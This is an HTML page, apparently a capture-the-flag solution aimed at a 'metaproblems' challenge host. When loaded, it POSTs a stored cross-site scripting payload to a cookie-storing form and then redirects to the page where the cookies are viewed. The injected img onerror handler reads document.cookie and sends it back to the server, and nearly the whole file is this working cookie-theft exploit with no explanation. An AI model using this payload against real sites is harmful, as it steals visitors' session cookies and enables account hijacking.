<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Set Cookies</title>
</head>
<body>
    <h1>Set Cookies</h1>
    <script>
        const metaCookies = `cookie_name=5&cookie_value="<img src="x" onerror="fetch('http://host3.metaproblems.com:6020/index.php',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'cookie_name=6&cookie_value="${encodeURIComponent(document.cookie)}"&submit=Store+Cookie'}).then(response => response.json()).then(data => console.log(data)).catch(error => console.error('Error:', error));">"&submit=Store+Cookie`;
        const url = 'http://host3.metaproblems.com:6020/index.php';
        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: metaCookies
        })
        .then(response => response.json())
        .then(data => console.log(data))
        .catch(error => console.error('Error:', error));
        // Redirect to view cookie URL after setting cookies
        window.location.href = 'http://host3.metaproblems.com:6020/cookies.php';
    </script>
</body>
</html>
